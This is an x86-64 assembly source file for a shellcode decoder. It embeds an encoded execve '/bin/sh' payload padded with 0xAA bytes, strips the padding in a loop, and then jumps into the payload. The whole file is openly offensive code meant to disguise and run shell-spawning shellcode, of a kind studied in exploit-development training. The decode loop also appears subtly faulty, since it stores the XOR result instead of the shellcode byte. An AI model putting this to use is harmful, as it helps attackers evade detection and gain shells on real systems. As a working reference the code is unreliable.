; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com
;
; Description : This decoder removes the extra Bytes padding added into the shellcode and then
; 				executes it.
;
; NOTE : Just add the shellcode (comma separated values) after the label 'shellcode'
;
; SHELLCODE LENGTH = 



global _start


section .text
_start:
	
	jmp Main
	encoded_shellcode:	db	 0xeb,0xaa,0x10,0xaa,0x5f,0xaa,0x57,0xaa,0x48,0xaa,0x89,0xaa,0xe6,0xaa,0x48,0xaa,0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x48,0xaa,0x89,0xaa,0xe2,0xaa,0xb0,0xaa,0x3b,0xaa,0x0f,0xaa,0x05,0xaa,0xe8,0xaa,0xeb,0xaa,0xff,0xaa,0xff,0xaa,0xff,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa, 0xbb,0xbb,0xbb,0xbb


Main:

	lea rsi, [rel encoded_shellcode]
	xor rdi, rdi
	;mov	rcx, rdi
	add rdi, 0x1			; Points to actual shellcode bytes
	xor rax, rax			
	add rax, 0x2			; Points to inserted bytes (0xAA's)
	
	;mov	rcx, 29				; Half the Length of encoded shellcode minus 1 (-1)
	
		
decode:
	
	mov	bl, byte [rsi + rax]
	xor bl, 0xaa
	jnz	short encoded_shellcode	
	mov	byte [rsi + rdi], bl 
	inc rdi
	add rax, 0x2
	jmp short decode

	


